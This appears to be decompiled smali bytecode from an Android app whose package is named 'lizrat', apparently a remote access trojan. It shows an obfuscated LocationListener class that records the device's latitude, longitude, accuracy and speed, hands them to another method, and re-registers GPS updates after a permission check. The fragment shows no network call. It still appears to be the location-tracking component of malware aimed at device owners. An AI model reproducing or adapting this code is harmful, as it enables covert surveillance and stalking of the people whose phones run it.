.class LLiz0rd/lizrat/celebratevmallkdiversityjmuseumlgeologicaldloginsgamespotoadaptationcverzeichnisialignmentr7$1;
.super Ljava/lang/Object;
.source "celebratevmallkdiversityjmuseumlgeologicaldloginsgamespotoadaptationcverzeichnisialignmentr7.java"

# interfaces
.implements Landroid/location/LocationListener;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = LLiz0rd/lizrat/celebratevmallkdiversityjmuseumlgeologicaldloginsgamespotoadaptationcverzeichnisialignmentr7;->ru()V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:LLiz0rd/lizrat/celebratevmallkdiversityjmuseumlgeologicaldloginsgamespotoadaptationcverzeichnisialignmentr7;


# direct methods
.method constructor <init>(LLiz0rd/lizrat/celebratevmallkdiversityjmuseumlgeologicaldloginsgamespotoadaptationcverzeichnisialignmentr7;)V
    .locals 0

    .line 104
    iput-object p1, p0, LLiz0rd/lizrat/celebratevmallkdiversityjmuseumlgeologicaldloginsgamespotoadaptationcverzeichnisialignmentr7$1;->this$0:LLiz0rd/lizrat/celebratevmallkdiversityjmuseumlgeologicaldloginsgamespotoadaptationcverzeichnisialignmentr7;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public onLocationChanged(Landroid/location/Location;)V
    .locals 6

    if-eqz p1, :cond_1

    .line 107
    invoke-virtual {p1}, Landroid/location/Location;->getLongitude()D

    move-result-wide v0

    sput-wide v0, LLiz0rd/lizrat/celebratevmallkdiversityjmuseumlgeologicaldloginsgamespotoadaptationcverzeichnisialignmentr7;->Longting:D

    .line 108
    invoke-virtual {p1}, Landroid/location/Location;->getLatitude()D

    move-result-wide v0

    sput-wide v0, LLiz0rd/lizrat/celebratevmallkdiversityjmuseumlgeologicaldloginsgamespotoadaptationcverzeichnisialignmentr7;->ʾʼʾʿˈᵔঙʿ$ʿʼ:D

    .line 109
    invoke-virtual {p1}, Landroid/location/Location;->getAccuracy()F

    move-result v0

    sput v0, LLiz0rd/lizrat/celebratevmallkdiversityjmuseumlgeologicaldloginsgamespotoadaptationcverzeichnisialignmentr7;->letliudid:F

    .line 110
    invoke-virtual {p1}, Landroid/location/Location;->getSpeed()F

    move-result p1

    sput p1, LLiz0rd/lizrat/celebratevmallkdiversityjmuseumlgeologicaldloginsgamespotoadaptationcverzeichnisialignmentr7;->sp:F

    .line 111
    iget-object v0, p0, LLiz0rd/lizrat/celebratevmallkdiversityjmuseumlgeologicaldloginsgamespotoadaptationcverzeichnisialignmentr7$1;->this$0:LLiz0rd/lizrat/celebratevmallkdiversityjmuseumlgeologicaldloginsgamespotoadaptationcverzeichnisialignmentr7;

    sget-wide v1, LLiz0rd/lizrat/celebratevmallkdiversityjmuseumlgeologicaldloginsgamespotoadaptationcverzeichnisialignmentr7;->ʾʼʾʿˈᵔঙʿ$ʿʼ:D

    sget-wide v3, LLiz0rd/lizrat/celebratevmallkdiversityjmuseumlgeologicaldloginsgamespotoadaptationcverzeichnisialignmentr7;->Longting:D

    sget v5, LLiz0rd/lizrat/celebratevmallkdiversityjmuseumlgeologicaldloginsgamespotoadaptationcverzeichnisialignmentr7;->letliudid:F

    invoke-static/range {v0 .. v5}, LLiz0rd/lizrat/celebratevmallkdiversityjmuseumlgeologicaldloginsgamespotoadaptationcverzeichnisialignmentr7;->access$000(LLiz0rd/lizrat/celebratevmallkdiversityjmuseumlgeologicaldloginsgamespotoadaptationcverzeichnisialignmentr7;DDF)V

    .line 112
    sget-object p1, LLiz0rd/lizrat/celebratevmallkdiversityjmuseumlgeologicaldloginsgamespotoadaptationcverzeichnisialignmentr7;->LM:Landroid/location/LocationManager;

    const-string v0, "gps"

    invoke-virtual {p1, v0}, Landroid/location/LocationManager;->isProviderEnabled(Ljava/lang/String;)Z

    move-result p1

    if-eqz p1, :cond_1

    .line 115
    :try_start_0
    sget-object p1, LLiz0rd/lizrat/celebratevmallkdiversityjmuseumlgeologicaldloginsgamespotoadaptationcverzeichnisialignmentr7;->LM:Landroid/location/LocationManager;

    sget-object v0, LLiz0rd/lizrat/celebratevmallkdiversityjmuseumlgeologicaldloginsgamespotoadaptationcverzeichnisialignmentr7;->LL:Landroid/location/LocationListener;

    invoke-virtual {p1, v0}, Landroid/location/LocationManager;->removeUpdates(Landroid/location/LocationListener;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    nop

    .line 118
    :goto_0
    iget-object p1, p0, LLiz0rd/lizrat/celebratevmallkdiversityjmuseumlgeologicaldloginsgamespotoadaptationcverzeichnisialignmentr7$1;->this$0:LLiz0rd/lizrat/celebratevmallkdiversityjmuseumlgeologicaldloginsgamespotoadaptationcverzeichnisialignmentr7;

    invoke-virtual {p1}, LLiz0rd/lizrat/celebratevmallkdiversityjmuseumlgeologicaldloginsgamespotoadaptationcverzeichnisialignmentr7;->getApplicationContext()Landroid/content/Context;

    move-result-object p1

    const-string v0, "android.permission.ACCESS_FINE_LOCATION"

    invoke-static {p1, v0}, Landroid/support/v4/app/ActivityCompat;->checkSelfPermission(Landroid/content/Context;Ljava/lang/String;)I

    move-result p1

    if-eqz p1, :cond_0

    iget-object p1, p0, LLiz0rd/lizrat/celebratevmallkdiversityjmuseumlgeologicaldloginsgamespotoadaptationcverzeichnisialignmentr7$1;->this$0:LLiz0rd/lizrat/celebratevmallkdiversityjmuseumlgeologicaldloginsgamespotoadaptationcverzeichnisialignmentr7;

    invoke-virtual {p1}, LLiz0rd/lizrat/celebratevmallkdiversityjmuseumlgeologicaldloginsgamespotoadaptationcverzeichnisialignmentr7;->getApplicationContext()Landroid/content/Context;

    move-result-object p1

    const-string v0, "android.permission.ACCESS_COARSE_LOCATION"

    invoke-static {p1, v0}, Landroid/support/v4/app/ActivityCompat;->checkSelfPermission(Landroid/content/Context;Ljava/lang/String;)I

    move-result p1

    if-eqz p1, :cond_0

    return-void

    .line 128
    :cond_0
    sget-object v0, LLiz0rd/lizrat/celebratevmallkdiversityjmuseumlgeologicaldloginsgamespotoadaptationcverzeichnisialignmentr7;->LM:Landroid/location/LocationManager;

    sget-wide v2, LLiz0rd/lizrat/celebratevmallkdiversityjmuseumlgeologicaldloginsgamespotoadaptationcverzeichnisialignmentr7;->t:J

    sget-wide v4, LLiz0rd/lizrat/celebratevmallkdiversityjmuseumlgeologicaldloginsgamespotoadaptationcverzeichnisialignmentr7;->d:J

    long-to-float v4, v4

    sget-object v5, LLiz0rd/lizrat/celebratevmallkdiversityjmuseumlgeologicaldloginsgamespotoadaptationcverzeichnisialignmentr7;->LL:Landroid/location/LocationListener;

    const-string v1, "gps"

    invoke-virtual/range {v0 .. v5}, Landroid/location/LocationManager;->requestLocationUpdates(Ljava/lang/String;JFLandroid/location/LocationListener;)V

    :cond_1
    return-void
.end method

.method public onProviderDisabled(Ljava/lang/String;)V
    .locals 0

    return-void
.end method

.method public onProviderEnabled(Ljava/lang/String;)V
    .locals 0

    return-void
.end method

.method public onStatusChanged(Ljava/lang/String;ILandroid/os/Bundle;)V
    .locals 0

    return-void
.end method
